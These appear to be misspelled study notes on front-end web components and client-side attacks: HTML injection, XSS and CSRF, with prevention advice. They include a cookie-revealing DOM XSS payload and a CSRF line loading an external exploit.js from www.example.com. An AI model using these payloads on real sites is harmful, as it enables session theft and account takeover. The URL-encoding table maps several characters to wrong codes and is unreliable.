# HTLM
The first and most dominant component of the frontend of web app is HypertextMarkUpLenguage. Ia a very core of any page we see in th internert.
```html
<!DOCTYPE html>
<html>
    <head>
        <title>Page Title</title>
    </head>
    <body>
        <h1>A Heading</h1>
        <p>A Paragraph</p>
    </body>
</html>


```
Estructure:
docuemnt
- html
    - head
        - title
    - body
        - h1
        - h2
Each HTML eleement opened and cloesed with a tag the specified the element id or class. `<p id='par1> or <p id='red Paragraph'>`

### URL Encoding:
An important concpet to learn in HTLM is URL Encoding, or percent-encoding, browser to properly display a page's contents, it has to know to charset in use.
Browser can only use ASCII encoding, which only allows alphanumerical characters and certain special characters.
All other characters outside os the ASCII characters-set have to be encoded within a URL. URL encoding replaces unsafe ASCII characters with a % symbol.
| Characters  | Encoding |
| -------------- | --------------- |
| !  | %21 |
| ~  | %22 |
| # | %23 |
| $ | %24 |
| % | %25 |
| & | %26 |
| '| %27 |
| {| %28 |
|  }| %29 |

Page of the full characters [here](https://www.w3schools.com/tags/ref_urlencode.ASP)
Many tools has the funtion encoding to decoding.
### Uasage:
The <heas> element usually contains elements thaty are not directly printed on the page, like tha page title, while all main page element are located under the <body>.
Others imporants tags are the <style> for the CSS and the <script> for the JS.
Each of this elements are calle a DOM(DOcument Obj Model), define as:
The W3X document Object model (DOM) is a plataform and lenguage-neutral interface that allows programs and scripts to dynamically access and update the content, stucture
and style document.

The DOM standard is separate into 3 parts:
- Core DOM - the standard model for all document types.
- XML DOM - the standard model for XML documents.
- HTML DOM - The standard model for HTML documents.

## Cascading Style SHeets(CSS):
CSS is the stylesheet used alongside HTML to format and set the style the elements, example:
```css
body {
  background-color: black;
}

h1 {
  color: white;
  text-align: center;
}

p {
  font-family: helvetica;
  font-size: 10px;
}


```
### Syntax:
The style of each element curly brackets{}, within which the properties are defined with their values.
Each HTML element has many properties thaty can be set through CSS[Heigh, position, border, padding].
CSS can be used for advanced animations for a wide variety of use, from moving item all the way to advanced 3D animation.
CSS animations [here](https://www.w3schools.com/css/css3_animations.asp) and the structure is like @keyframesm animations...

### Usage:
The showns that even HTML and CSS are among the mos basic cornestones of web dev when used, properly, they can be used to build visually stunnin web pages
and make it interact.

### Frameworks:
These Frameworks optimitted for web app usage, are designed to be used with JS and for wide use within a web app and contain elements usually required within modern web app.
Most common frameworks:
- Bootstrap
- SASS
- Foundation
- Bulma
- Pure

## Javascript:
Javascript is one of the most used languages in the world, it's most usage lenguage in the world. Is usually used on the front end of an ap to be execute
within a browser.
While HTML and CSS are mainly charge of how pages looks, JS is usually to control any funcionality that web required.
```js
document.getElementById("button1").innerHTML = "Changed Text!";
```
Page for test JS [here](https://jsfiddle.net/)

### Usage:
Most common web app heavily rely on JS to drive all needed funtionality onm the web app, like uploading the web page view in real-time, dynamically
uploading content in real-time, accepting and processing user input, and many iter petencial funcionalities.
Js is also used to automate complex processes and perfrom HTTTP requests to interact with the backend componenets and send an retrive data, thought the tech
like Ajax.
### Frameworks:
Most common frameworks:
- Angular
- React
- Vue
- jQuery

## Sensitivedata Explosure:
All the front end comopennts we converd are interacted with a cliend side, as these compopnetnts are executed on the client-side, they put  the end-user in danger of being
attacked and exploited if they do have vulnerabilities.
Majority od web app pentest is focused on backend components.
Sensitive Data Exposure referes to the availability of sensitive rdata in clear-text to the end-user, this is usually in the source code of the web pages or pages source on th front end
web app.
This is the HTML source code od the app, not be confused with the back en code. [View Source Code, or Bursuite or URL(view-source:https://)], sometimes find some credentials
or hashes.
### Prevention:
Only put the necessary information on the frontend code, also is important to classify the data type with the source code and apply controls on what can or cannot be exposed
on the client side.
Front-end dev may want to use JS code packing or obfuscation to reduce the chances od exposing sensitive data.

## HTML Injection:
This occurs when unfiltered user input is displayed on the page, This can be through retrivering previusly sumitteed code, like retreiving a user comment from the back end database,
or directly displayin unfiltered user input through JS.
When a user has complete the control of how their input will be displayed, can sumbimt HTML code, and the browser may display it was part of the page.
This may include the malicius HTML code, like external login form, which can be used to trick user into loggin in whuile actually sending their login.
If no input sanitazion in place, this is potencially an ez tageted for HTML Injection and Cross-Site Scripting(XSS) attack.
To test HTML injection, we can simply input a small snipped of HTML code as our name, and see if it desplayed as part of page.
`<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>`

## Cross-Site Scripting (XSS)
HTML injection vulnerabilities can often be utilized to also perfrom XSS attacks by injection JS code to be executeed on the client-side.
XSS is very simi lar to HTML injection, this involves the injection of JS codeto perform mor advanced attacks on the client-side, insted of marely injectio HTML.

| Type  | Description|
| -------------- | --------------- |
| Reflected XSS | Occurs when user input is displayed on the page after processing result or error.|
| Stroerd XSS| Occurs when user input is stored in the back en data basse and then displayed upon retriveral.|
| DOM XSS| Occurs when user input is directly shown n the browser and is written to an HTML DOM obj.|

Injection to following DOM XSS JS code as a payload, which should show us tho cookie value from current user.
`#"><img src=/ onerror=alert(document.cookie)>`
This payload is accesing the HTML docuemnt tree and retrivering the cookie obj value, When the browser processes our input, it will be considered a new DOM, and our
JS will be executed, displaying the cookie value back to us in a popup.

## Cross-Site Request Forgery(CSRF)
This attack utilize XSS vulnerabilities to perfrom certain quieries, and API calls on a web app thayt the victim is currently auth.
This would allow the attacker to perform actions as the auth user, may also utilize other vulnerabilities to perform the same funtions.
A common CSRF attack to gain higher privilegeed access to a web app os to craft a JS payload automatically chganges the vitims pass to the value set by the attacker.
Once the victim views the payload on the vulnerable page, malicius comment containing the JS CSRF.
CSRF can be leveraged to attack admins and gain ascess to their acc, admins usually have access to sensitive funtions, whichj can sometimes be used to attack and gain control over
the back-end server.
`"><script src=//www.example.com/exploit.js></script>`, the exploit.js file would contain the malicius js code that changes the user's pass in this case requires knowledge of
this web apps pass changing precedure APIs.

### Prevention:
Its also always important to filter and sanitaze user input on the front end before reaches the back end, asn especially is this code may be displayed directly on the
client-side without communication with the backend. Control must be applied:
| Type | Description |
| -------------- | --------------- |
| Sanitization| Removing special characters and non-standard characters from user input before displying it or stroing it.|
| Validation| Ensuring that submitted user input matches the expected format.|

Once we sanitiz and validate user input and diplayed output, we should  be able to prenvent attacks like HTML Injection, XSS or CSRF.
Solution would be to implement a web app firewall (WAF), which should help to prevent injection attemps automatically.
Many Moderns web app have anti-CSRF mesures, including certain HTTP headers and flags that cann prevent automated requests.

